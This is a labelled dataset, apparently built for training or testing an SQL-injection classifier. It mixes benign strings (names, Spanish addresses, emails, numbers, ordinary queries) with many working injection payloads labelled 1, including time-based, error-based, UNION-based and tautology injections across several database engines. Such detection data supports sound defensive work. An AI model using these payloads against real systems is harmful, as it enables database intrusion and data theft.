payload	label
"1%""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""%""  =  """	1
bordagorry	0
c/ bellavista, 70 10h	0
c/ fontans, 124, 10?c	0
"-9737""   )    )     )   order by 1--"	1
1 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  	1
SELECT * FROM bee FETCH FIRST 50 PERCENT ROWS ONLY	0
1' and   (  3020  =  3020  )  *6703 and 'tmng' like 'tmng	1
   SELECT complex, tight, slept FROM there WHERE scientist  IS NULL	0
SELECT * FROM colony  WHERE cook = everybody	0
mcglynn	0
colja@suecas.com.tel	0
" end and   (  ""nuix"" like ""nuix"	1
   SELECT enemy, pay+ ', ' + process+ ' ' + myself+ ', ' + hold AS value  FROM stick	0
SELECT * FROM name 3 SELECT * FROM pocket	0
SELECT AVG ( say ) FROM shirt SELECT SUM ( desert ) 	0
select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'bnfu' like 'bnfu	1
SELECT smallest ( s )  FROM key UNION ALL	0
"SELECT QUARTER ( ""2017-01-01 09:34:21"" ) ;"	0
brihuega	0
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'zaes'  =  'zaes	1
 (  case when 6398  =  6398 then 1 else null end  ) 	1
pl. heroes de espaa 20 11?g	0
preixens	0
45681	0
1'+  (  select uqdb where 3508  =  3508 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --	1
SELECT AVG ( number ) FROM draw SELECT SUM ( sound ) 	0
"1%""  )   union all select null,null,null,null,null,null,null,null,null,null#"	1
SELECT * FROM mainly WHERE alike = 'map' LIMIT 3	0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  ""%""  =  """	1
SELECT * FROM vessels FETCH FIRST 3 ROWS ONLY	0
SELECT AVG ( task ) FROM medicine SELECT SUM ( shut ) 	0
SELECT * FROM fruit WHERE NOT recall = 'wheel'  AND NOT breathing = 'team'	0
FROM  ( SELECT DISTINCT include FROM high ) 	0
SELECT AVG ( safety ) FROM able	0
1'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --	1
DELETE FROM eager	0
"1""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""text"" like ""text"	1
gallinero de cameros	0
4978850000000000	0
SELECT AVG ( Price ) FROM pure	0
SELECT AVG ( our ) FROM wise SELECT SUM ( outer ) 	0
yahed	0
SELECT * FROM turn WHERE central LIKE '%who%'	0
 UPDATE seems SET some = 'flag'WHERE son = 'distant'	0
SELECT * FROM club  WHERE planning NOT LIKE '[pocket]%'	0
1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --	1
SELECT * FROM voice WHERE production BETWEEN '1996-07-01' AND '1996-07-31'	0
  SELECT coffee AS sun, coast AS [already]  FROM ruler	0
1'+  (  select iowv where 6105  =  6105 and sleep  (  5  )  #	1
-1550' in boolean mode  )   union all select 9777,9777,9777--	1
1'  )   as jwch where 4609  =  4609	1
"1"" and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --"	1
villamediana de iregua	0
SELECT COUNT ( birthID ) FROM rise	0
1'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'gxpr'  =  'gxpr	1
"1""   )    )    as ljhz where 2416  =  2416"	1
1'   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --	1
-1796'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'lpuw' like 'lpuw	1
" SELECT RPAD ( CustomerName, 30, ""ABC"" )  AS RightPadCustomerName FROM Customers; "	0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and ""ulfr"" like ""ulfr"	1
-4807' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'wwki'  =  'wwki	1
INSERT INTO were  ( tightly, must, house )  VALUES  ( 'weight', 'because', 'mad' )  	0
1'  )   and elt  (  4249  =  4249,7259  )   and   (  'bxnn'  =  'bxnn	1
1'+  (  select llcl where 8188  =  8188 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
SELECT * FROM in WHERE another BETWEEN '1996-07-01' AND '1996-07-31'	0
6204150000000000	0
if  (  8284  =  6171  )   select 8284 else drop function mbih--	1
SELECT * FROM potatoes WHERE simplest = 'felt'  AND  ( alphabet = 'skin' OR group = 'pilot' ) 	0
1' and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --	1
SELECT * FROM receive FETCH FIRST 3 ROWS ONLY	0
8095700000000001	0
SELECT AVG ( Price ) FROM which	0
SELECT * FROM poetry	0
1   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  9802  =  9802	1
29450	0
1   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --	1
SELECT COUNT ( steady ) FROM recognize	0
manzanilla	0
SELECT entire	0
SELECT written ( s ) FROM sail INNER JOIN	0
SELECT AVG ( rain ) FROM found	0
recomendaci$n	0
28614822q	0
SELECT * FROM north ORDER BY use DESC	0
"-2226%""   )    )    union all select 1018,1018,1018,1018--"	1
terangue	0
SELECT * FROM north WHERE church = 'especially'	0
SELECT * FROM wood WHERE NOT recent = 'tone'  AND NOT wore = 'those'	0
1 rlike sleep  (  5  )  # urxh	1
1 where 3502  =  3502 order by 1--	1
calle padre payan 127,	0
DELETE FROM basic	0
select   (  case when   (  1227  =  4014  )   then 1227 else 1227*  (  select 1227 from mysql.db  )   end  )  #	1
SELECT yourself FROM fair	0
1'||  (  select 'mzhj' where 9677  =  9677 union all select null,null,null--	1
SELECT * FROM fall	0
SELECT order ( s )  FROM continued LEFT JOIN	0
greaves3	0
 UNION SELECT	1
SELECT importance ( s ) FROM carried INNER JOIN	0
-2287'   )    )    union all select 1200,1200,1200,1200,1200#	1
1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  	1
"SELECT * FROM visit WHERE toward BETWEEN ""flame"" AND    ""sheet"""	0
SELECT zulu ( s )  FROM no FULL OUTER JOIN	0
SELECT largest FROM those UNION SELECT per FROM result ORDER BY pretty	0
SELECT * FROM loose WHERE section = 'border' LIMIT 3	0
"1""   )    )    as mvxa where 3024  =  3024"	1
SELECT TOP 3 * FROM hall	0
stankova@carrillo-de-albornoz.pt	0
SELECT COUNT ( DISTINCT breeze )  FROM mean	0
SELECT * FROM kids WHERE avoid BETWEEN '1996-07-01' AND '1996-07-31'	0
-2055  )   or 3038  =  3038	1
"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #"	1
mirko	0
SELECT * FROM fly WHERE nails = 'layers' FETCH FIRST 3 ROWS ONLY	0
"1""   )    )    as lslk where 6729  =  6729 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --"	1
46881104c	0
end and 'wdce'  =  'wdce	1
SELECT COUNT ( DISTINCT electricity )  FROM design	0
SELECT DISTINCT children FROM were	0
calle hostieros, 24	0
tronchuda	0
1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --	1
1'  )   as gogu where 4338  =  4338 union all select null#	1
SELECT * FROM repeat	0
  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  	1
SELECT COUNT ( plates ) FROM needed	0
"1""  )   as tqxa where 6751  =  6751 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --"	1
1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'	1
1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'bdsq' like 'bdsq	1
brenn	0
SELECT independent ( s ) FROM go INNER JOIN	0
1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) 	1
82380804w	0
-9574%'   )    )    union all select 5645,5645,5645,5645,5645,5645,5645--	1
19140	0
SELECT * FROM earn WHERE strong = 'toward'	0
" select * from users where id  =  1 or ""  (  ,""  =  1 or 1  =  1 -- 1"	1
dangers9@paremoselalzheimer.az	0
SELECT TOP 50 PERCENT * FROM read SELECT * FROM kept FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM beyond	0
SELECT * FROM parts WHERE pond = 'joy'  AND City = 'cell'	0
SELECT * FROM serious 3 SELECT * FROM similar	0
winstanley@waterflyesp.hn	0
SELECT * FROM century ORDER BY tobacco DESC	0
SELECT AVG ( stream ) FROM reader SELECT SUM ( drink ) 	0
alberuela de tubo	0
SELECT COUNT ( anyone ) FROM mistake	0
  SELECT blueID AS ID, seven AS classroom FROM acres	0
   SELECT grade, letter, caveFROM being WHERE arrange  IS NOT NULL	0
 or 3  =  3	1
 UPDATE lift SET try = 'thin'WHERE occur = 'season'	0
1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'drui' like 'drui	1
1' in boolean mode  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  #	1
SELECT * FROM or WHERE may = 'box' LIMIT 3	0
1'||  (  select 'kfyh' where 4737  =  4737 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   ||'	1
SELECT correctly ( s FROM cow RIGHT JOIN	0
cel65co	0
SELECT TOP 3 * FROM freedom WHERE somewhere = 'acres'	0
-2743 union all select 6757,6757,6757,6757,6757,6757--	1
lilah	0
 UPDATE noun SET else = 'negative'WHERE late = 'audience'	0
SELECT * FROM luck FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM daughter	0
amber	0
"1%"" and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"	1
1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'eznq' like 'eznq	1
1 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   -- zozj	1
chi-keun	0
SELECT COUNT ( DISTINCT stand )  FROM parent	0
1820	0
SELECT worker ( s )  FROM outline SELECT pale FROM power	0
   SELECT night,fireplace,garage,toy,chain     (  (  hill JOIN old ON thick.row =  pull.stock )   INNER JOIN governmentON Orders.pig =  layers.immediatelyID ) 	0
SELECT * FROM general WHERE half = 'log' FETCH FIRST 3 ROWS ONLY	0
"-8550""  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kyad""  =  ""kyad"	1
26241	0
1'+  (  select 'kcix' where 1117  =  1117	1
1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'lvck'  =  'lvck	1
SELECT * FROM  ( SELECT bell FROM yes ) 	0
-9197'  )   or   (  6877  =  8010  )  *8010 and   (  'umwl'  =  'umwl	1
carrer pompeu fabra, 151,	0
"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--"	1
1   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   5139  =  5139	1
SELECT minerals ( s )  FROM folks LEFT JOIN	0
"admin"" or ""1""  =  ""1"	1
SELECT * FROM  ( SELECT shallow FROM drive ) 	0
86064216x	0
6019	0
DELETE FROM thought WHERE black = 'declared'	0
55235483v	0
shiomi@errebebe.ug	0
select   (  case when   (  5856  =  7176  )   then 5856 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--	1
SELECT * FROM popular WHERE grandfather = 'after' FETCH FIRST 3 ROWS ONLY	0
1  )   waitfor delay '0:0:5'--	1
SELECT * FROM job WHERE wash = 'floating' FETCH FIRST 3 ROWS ONLY	0
"1%""   )    )     )   and 2006  =  2006"	1
18120	0
aira vials	0
SELECT * FROM officer WHERE standard BETWEEN early09/01/1996influence AND relationship15/31/1996duty	0
"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  "	1
-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#	1
1  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) 	1
1'+  (  select 'yyyn' where 5395  =  5395	1
c/ animas, 101,	0
 select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1	1
1' in boolean mode  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  #	1
 select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1	1
1  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
SELECT * FROM found WHERE ride BETWEEN '1996-07-01' AND '1996-07-31'	0
hormilleja	0
SELECT hot ( s )  FROM division LEFT JOIN	0
SELECT * FROM poem WHERE stage = 'happen' LIMIT 3	0
SELECT * FROM silent WHERE cover IN  ( SELECT bet FROM bet ) 	0
5855	0
SELECT automobile ( s )  FROM while LEFT JOIN	0
1%'   )    )     )   and sleep  (  5  )  #	1
estanislao	0
1'   )    )     )   and 7533  =  7533 and    (    (     (  'hoyw'  =  'hoyw	1
 SELECT column_name ( s )  FROM pound,bet	0
calle velardes s/n 1?e	0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_1_text' LIMIT 1	0
1' where 7828  =  7828 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --	1
c/ los rosales 166, 6f	0
3119850000000000	0
iif  (  4638  =  8258,1,1/0  )  	1
SELECT MIN ( tell )  AS difference FROM detail	0
SELECT COUNT ( education ) FROM memory	0
ilya	0
8859240000000000	0
marice	0
3655910000000000	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28797 )  ORDER BY meta_id ASC	0
695	0
SELECT * FROM off WHERE motion = 'no'	0
"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#"	1
SELECT * FROM house WHERE bridge BETWEEN sat09/01/1996thread AND nation15/31/1996daily	0
SELECT * FROM pack WHERE Price NOT BETWEEN 10 AND 20	0
1' or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #	1
"1""   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""llgb"" like ""llgb"	1
1'||  (  select 'ysij' from dual where 6140  =  6140 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||'	1
8121	0
SELECT * FROM probably  WHERE thou NOT LIKE '[account]%'	0
parra	0
"SELECT * FROM living WHERE driven BETWEEN ""him"" AND    ""consist"""	0
banderizar	0
-9382'  )   union all select 4774,4774,4774,4774--	1
1   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
-1470'   )    )     )   or 9323  =  9323#	1
mathieso	0
hiromi	0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367532 ) 	0
SELECT * FROM enemy  WHERE bark NOT LIKE '[body]%'	0
 SELECT column_name ( s )  FROM sad,wonderful	0
hemisfero	0
22809	0
SELECT COUNT ( valueID ) FROM he	0
 SELECT column_name ( s )  FROM task,wolf	0
1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  	1
